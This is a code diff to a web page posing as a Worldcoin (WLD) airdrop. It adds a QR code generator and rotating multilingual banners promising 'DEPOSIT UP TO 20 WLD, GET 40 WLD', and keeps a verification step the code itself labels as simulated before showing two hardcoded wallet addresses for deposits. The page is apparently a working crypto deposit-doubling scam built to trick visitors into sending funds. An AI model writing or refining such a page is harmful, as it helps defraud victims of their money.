@@ -34,27 +34,17 @@ html,body{
   to{transform:rotateY(360deg)}
 }
 
-/* AIRDROP TEXT */
+/* AIRDROP TEXT (CONTROLADO POR JS) */
 .airdrop-text{
   margin-top:22px;
   font-weight:700;
   letter-spacing:2px;
-}
-.airdrop-text span{
-  display:block;
-  font-size:18px;
+  font-size:20px;
   opacity:0;
-  animation:airdrop 6s infinite;
+  transition:opacity 1s ease;
 }
-.airdrop-text span:nth-child(1){animation-delay:0s}
-.airdrop-text span:nth-child(2){animation-delay:1.5s}
-.airdrop-text span:nth-child(3){animation-delay:3s}
-.airdrop-text .highlight{font-size:32px}
-@keyframes airdrop{
-  0%{opacity:0;transform:translateY(20px)}
-  20%{opacity:1;transform:translateY(0)}
-  70%{opacity:1}
-  100%{opacity:0;transform:translateY(-20px)}
+.airdrop-text.show{
+  opacity:1;
 }
 
 /* VERIFY */
@@ -87,8 +77,7 @@ html,body{
   display:none;
   margin-top:26px;
 }
-.qr-box img{
-  width:160px;
+#qrCanvas{
   background:#fff;
   padding:12px;
   border-radius:14px;
@@ -143,11 +132,8 @@ html,body{
 
   <img src="logowld.png" class="logo">
 
-  <div class="airdrop-text">
-    <span>100% EARN AIRDROP</span>
-    <span>DEPOSIT UP TO 20 WLD</span>
-    <span class="highlight">GET 40 WLD</span>
-  </div>
+  <!-- AIRDROP TEXT -->
+  <div class="airdrop-text" id="airdropText"></div>
 
   <!-- VERIFY -->
   <div id="widBox">
@@ -159,7 +145,7 @@ html,body{
 
   <!-- QR -->
   <div class="qr-box" id="qrBox">
-    <img id="qrImage" src="qr.jpeg">
+    <canvas id="qrCanvas" width="160" height="160"></canvas>
     <div class="renew">renew in <span id="renewCounter">20</span></div>
   </div>
 
@@ -174,21 +160,61 @@ html,body{
 
 </div>
 
+<!-- QR GENERATOR -->
+<script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
+
 <script>
-/* ===== WALLETS ===== */
+/* ================= AIRDROP TEXTS ================= */
+const AIRDROP_TEXTS = [
+  "100% EARN AIRDROP",
+  "DEPOSIT UP TO 20 WLD",
+  "GET 40 WLD",
+  "DEPOSITE PARA RECIBIR AIRDROP",
+  "DEPOSITE PARA RECEBER AIRDROP",
+  "DÉPOSEZ POUR RECEVOIR AIRDROP",
+  "DEPOSITA PER RICEVERE AIRDROP"
+];
+
+let airdropIndex = 0;
+const airdropText = document.getElementById("airdropText");
+
+function startAirdropText(){
+  airdropText.innerText = AIRDROP_TEXTS[airdropIndex];
+  airdropText.classList.add("show");
+
+  setInterval(()=>{
+    // fade out
+    airdropText.classList.remove("show");
+
+    // cuando opacity = 0, cambiar texto
+    setTimeout(()=>{
+      airdropIndex = (airdropIndex + 1) % AIRDROP_TEXTS.length;
+      airdropText.innerText = AIRDROP_TEXTS[airdropIndex];
+      airdropText.classList.add("show");
+    },1000);
+  },3000);
+}
+
+/* ================= WALLETS ================= */
 const WALLETS = [
   "0x1f62e7890d5db2c94c280547876b050f5d1816c5",
   "0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
 ];
 let walletIndex = 0;
 
-/* ===== VERIFY (SIMULADO) ===== */
+/* ================= QR ================= */
+const qr = new QRious({
+  element: document.getElementById("qrCanvas"),
+  size: 160,
+  value: WALLETS[0]
+});
+
+/* ================= VERIFY (SIMULADO) ================= */
 verifyBtn.onclick = () => {
   widBox.style.display = "none";
   spinner.style.display = "block";
   status.textContent = "Verifying…";
 
-  // ⏳ spinner dura 4 segundos
   setTimeout(() => {
     spinner.style.display = "none";
     status.textContent = "✔ Verified";
@@ -196,16 +222,17 @@ verifyBtn.onclick = () => {
   }, 4000);
 };
 
-/* ===== SHOW DEPOSIT ===== */
+/* ================= SHOW DEPOSIT ================= */
 function showDeposit(){
   status.textContent = "Deposit to receive the airdrop";
   qrBox.style.display = "block";
   depositBox.style.display = "block";
   updateWallet();
   startRenew();
+  startAirdropText();
 }
 
-/* ===== RENEW (20s) ===== */
+/* ================= RENEW (20s) ================= */
 let renew = 20;
 let angle = 0;
 
@@ -219,7 +246,7 @@ function startRenew(){
       updateWallet();
 
       angle = (angle + 90) % 360;
-      qrImage.style.transform = `rotate(${angle}deg)`;
+      qrCanvas.style.transform = `rotate(${angle}deg)`;
 
       renew = 20;
       renewCounter.textContent = renew;
@@ -227,12 +254,13 @@ function startRenew(){
   },1000);
 }
 
-/* ===== UPDATE WALLET ===== */
+/* ================= UPDATE WALLET + QR ================= */
 function updateWallet(){
   addr.value = WALLETS[walletIndex];
+  qr.set({ value: WALLETS[walletIndex] });
 }
 
-/* ===== COPY ===== */
+/* ================= COPY ================= */
 copyBtn.onclick = () => {
   navigator.clipboard.writeText(addr.value);
   copyMsg.style.opacity = 1;
